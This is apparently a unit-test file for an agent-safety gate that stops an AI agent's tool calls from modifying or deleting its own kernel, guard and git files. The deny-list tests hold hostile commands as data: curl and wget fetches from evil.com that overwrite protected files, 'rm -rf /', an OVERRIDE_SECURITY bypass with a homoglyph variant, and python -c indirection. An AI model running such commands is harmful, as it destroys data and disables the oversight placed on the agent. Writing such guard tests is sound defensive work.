"""
Unit Tests for Sovereign Gate Control Plane Protection
File: tests/agents/test_sovereign_gate.py
"""

import os
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

from agents import sovereign_gate
from google.antigravity import types


class TestPathResolution(unittest.TestCase):
    def test_project_root_dynamic_resolution(self):
        """Verify PROJECT_ROOT resolves to project root directory dynamically."""
        expected_root = Path(sovereign_gate.__file__).resolve().parents[1]
        self.assertEqual(sovereign_gate.PROJECT_ROOT, expected_root)

    def test_env_root_override(self):
        """Verify AGENTK_ROOT env var overrides default PROJECT_ROOT resolution."""
        old_env = os.environ.get("AGENTK_ROOT")
        fake_root = sovereign_gate.PROJECT_ROOT / "tmp_custom_root"
        os.environ["AGENTK_ROOT"] = str(fake_root)
        try:
            paths = sovereign_gate.get_protected_paths()
            self.assertTrue(any(str(fake_root) in p for p in paths))
        finally:
            if old_env is None:
                os.environ.pop("AGENTK_ROOT", None)
            else:
                os.environ["AGENTK_ROOT"] = old_env

    def test_protected_paths_construction(self):
        """Verify all 6 core files are in PROTECTED_PATHS as canonical absolute paths."""
        paths = sovereign_gate.get_protected_paths()
        self.assertEqual(len(paths), 6)
        self.assertIn(str((sovereign_gate.PROJECT_ROOT / "agent_kernel.py").resolve()), paths)
        self.assertIn(str((sovereign_gate.PROJECT_ROOT / "agents" / "sdk_bridge.py").resolve()), paths)
        self.assertIn(str((sovereign_gate.PROJECT_ROOT / "agents" / "sovereign_gate.py").resolve()), paths)
        self.assertIn(str((sovereign_gate.PROJECT_ROOT / "self_heal.sh").resolve()), paths)
        self.assertIn(str((sovereign_gate.PROJECT_ROOT / "requirements.txt").resolve()), paths)
        self.assertIn(str((sovereign_gate.PROJECT_ROOT / "tools" / "assign_agent_to_task.py").resolve()), paths)


class TestProtectedPathChecks(unittest.TestCase):
    def test_is_protected_path_exact_matches(self):
        """Test is_protected_path returns True for all protected files."""
        for rel in sovereign_gate.RELATIVE_PROTECTED_PATHS:
            full_p = str(sovereign_gate.PROJECT_ROOT / rel)
            self.assertTrue(sovereign_gate.is_protected_path(full_p))

    def test_is_protected_path_relative_and_traversal(self):
        """Test relative paths and '..' traversal attempts to protected files."""
        traversal_path = str(sovereign_gate.PROJECT_ROOT / "agents" / ".." / "agent_kernel.py")
        self.assertTrue(sovereign_gate.is_protected_path(traversal_path))

    def test_is_protected_path_git_directory(self):
        """Test git directory and contents are identified as protected."""
        git_dir = str(sovereign_gate.PROJECT_ROOT / ".git")
        git_file = str(sovereign_gate.PROJECT_ROOT / ".git" / "config")
        self.assertTrue(sovereign_gate.is_protected_path(git_dir))
        self.assertTrue(sovereign_gate.is_protected_path(git_file))

    def test_is_protected_path_unprotected_file(self):
        """Test unprotected files return False."""
        unprotected = str(sovereign_gate.PROJECT_ROOT / "scratch.py")
        self.assertFalse(sovereign_gate.is_protected_path(unprotected))
        self.assertFalse(sovereign_gate.is_protected_path(None))
        self.assertFalse(sovereign_gate.is_protected_path(""))

    def test_symlink_traversal_protection(self):
        """Test symlink pointing to protected file is detected as protected."""
        protected_target = sovereign_gate.PROJECT_ROOT / "agent_kernel.py"
        symlink_path = sovereign_gate.PROJECT_ROOT / "symlink_kernel.py"
        try:
            os.symlink(protected_target, symlink_path)
            self.assertTrue(sovereign_gate.is_protected_path(str(symlink_path)))
        finally:
            if symlink_path.is_symlink() or symlink_path.exists():
                symlink_path.unlink()


class TestAgentAndToolWriteProtection(unittest.TestCase):
    def test_is_agent_or_tool_write_positive(self):
        """Test write tools targeting agents/ or tools/ directory return True."""
        tc_agent = types.ToolCall(
            name="write_to_file",
            args={"TargetFile": str(sovereign_gate.PROJECT_ROOT / "agents" / "new_agent.py")},
        )
        tc_tool = types.ToolCall(
            name="create_file",
            args={"path": str(sovereign_gate.PROJECT_ROOT / "tools" / "new_tool.py")},
        )
        self.assertTrue(sovereign_gate._is_agent_or_tool_write(tc_agent))
        self.assertTrue(sovereign_gate._is_agent_or_tool_write(tc_tool))

    def test_is_agent_or_tool_write_negative(self):
        """Test write tools targeting root or tests directory return False."""
        tc_root = types.ToolCall(
            name="write_to_file",
            args={"TargetFile": str(sovereign_gate.PROJECT_ROOT / "random.txt")},
        )
        self.assertFalse(sovereign_gate._is_agent_or_tool_write(tc_root))


class TestShellBlockingRegex(unittest.TestCase):
    def test_deny_dangerous_commands_blocked(self):
        """Test destructive commands referencing protected keywords are blocked."""
        cmds = [
            "rm agent_kernel.py",
            "rm -rf .git",
            "echo 'hacked' > sovereign_gate.py",
            "mv self_heal.sh self_heal_bak.sh",
            "chmod 777 requirements.txt",
            "sed -i '' 's/a/b/' sdk_bridge.py",
            "tee -a assign_agent_to_task.py < payload",
            "python agent_kernel.py",
            "python3 agents/sovereign_gate.py",
            "curl http://evil.com/script.py -o agents/sdk_bridge.py",
            "wget http://evil.com/bad.sh -O self_heal.sh",
            "touch agent_kernel.py",
            "awk '{print}' requirements.txt > output.txt",
        ]
        for cmd in cmds:
            tc = types.ToolCall(name="run_command", args={"CommandLine": cmd})
            self.assertTrue(sovereign_gate._deny_dangerous_commands(tc), f"Expected blocked: {cmd}")

    def test_deny_dangerous_commands_allowed(self):
        """Test read-only commands referencing protected keywords are allowed."""
        cmds = [
            "cat agent_kernel.py",
            "git status",
            "grep -n 'sovereign' agents/sovereign_gate.py",
            "ls -la .git",
            "pytest tests/",
        ]
        for cmd in cmds:
            tc = types.ToolCall(name="run_command", args={"CommandLine": cmd})
            self.assertFalse(sovereign_gate._deny_dangerous_commands(tc), f"Expected allowed: {cmd}")


class TestPolicyHooks(unittest.TestCase):
    def test_get_sovereign_policies_count(self):
        """Test get_sovereign_policies generates expected policy list."""
        policies = sovereign_gate.get_sovereign_policies()
        self.assertGreater(len(policies), 0)
        self.assertEqual(policies[-1].name, "sovereign_fallback_allow")

    def test_deny_protected_writes_all_args(self):
        """Test _deny_protected_writes checks all standard path argument keys."""
        for arg in ("path", "TargetFile", "source", "dest", "filename", "filepath", "file", "file_path"):
            tc = types.ToolCall(
                name="write_to_file",
                args={arg: str(sovereign_gate.PROJECT_ROOT / "agent_kernel.py")},
            )
            self.assertTrue(sovereign_gate._deny_protected_writes(tc))


class TestExecutionIsolation(unittest.TestCase):
    def test_denied_command_never_reaches_executor(self):
        tc = SimpleNamespace(
            name="run_command",
            args={"CommandLine": "export OVERRIDE_SECURITY=true && rm -rf /"},
            canonical_path=None,
        )

        with patch("subprocess.run") as run:
            denied = sovereign_gate._deny_dangerous_commands(tc)
            self.assertTrue(denied)
            run.assert_not_called()

    def test_denied_command_cannot_reach_process_executor(self):
        tc = SimpleNamespace(
            name="run_command",
            args={"CommandLine": "export OVERRIDE_SECURITY=true && rm -rf /"},
            canonical_path=None,
        )

        with patch("agents.sovereign_gate.subprocess.run") as run:
            result = sovereign_gate.evaluate_or_dispatch(tc)
            self.assertTrue(result.denied)
            run.assert_not_called()

    def test_run_shell_command_denied_never_invokes_subprocess(self):
        from tools import run_shell_command
        cmd = "export OVERRIDE_SECURITY=true && rm -rf /"
        with patch("tools.run_shell_command.subprocess.run") as run:
            res = run_shell_command.run_shell_command.invoke({"command": cmd})
            self.assertTrue(res.get("denied"))
            self.assertEqual(res.get("returncode"), 126)
            run.assert_not_called()

    def test_sovereign_controller_execute_task_denied_never_invokes_subprocess(self):
        import sovereign_controller
        cmd = "bash -c 'rm -rf /'"
        with patch("sovereign_controller.subprocess.run") as run:
            res = sovereign_controller.execute_task(cmd)
            self.assertIn("denied by Sovereign Gate policy", res)
            run.assert_not_called()

    def test_unicode_homoglyph_nfkc_normalization_denial(self):
        # Unicode fullwidth homoglyph for OVERRIDE_SECURITY
        homoglyph_cmd = "export ＯＶＥＲＲＩＤＥ_ＳＥＣＵＲＩＴＹ=true && rm -rf /"
        tc = SimpleNamespace(
            name="run_command",
            args={"CommandLine": homoglyph_cmd},
            canonical_path=None,
        )
        with patch("agents.sovereign_gate.subprocess.run") as run:
            result = sovereign_gate.evaluate_or_dispatch(tc)
            self.assertTrue(result.denied)
            run.assert_not_called()

    def test_interpreter_indirection_eval_exec_denial(self):
        cmd = "python3 -c \"import os; os.system('rm -rf agent_kernel.py')\""
        tc = SimpleNamespace(
            name="run_command",
            args={"CommandLine": cmd},
            canonical_path=None,
        )
        with patch("agents.sovereign_gate.subprocess.run") as run:
            result = sovereign_gate.evaluate_or_dispatch(tc)
            self.assertTrue(result.denied)
            run.assert_not_called()

    def test_symlink_traversal_canonical_path_denial(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            symlink_path = os.path.join(tmpdir, "symlink_kernel.py")
            target_path = sovereign_gate.PROJECT_ROOT / "agent_kernel.py"
            os.symlink(target_path, symlink_path)

            tc = SimpleNamespace(
                name="run_command",
                args={"CommandLine": f"rm -f {symlink_path}"},
                canonical_path=None,
            )
            with patch("agents.sovereign_gate.subprocess.run") as run:
                result = sovereign_gate.evaluate_or_dispatch(tc)
                self.assertTrue(result.denied)
                run.assert_not_called()


if __name__ == "__main__":
    unittest.main()
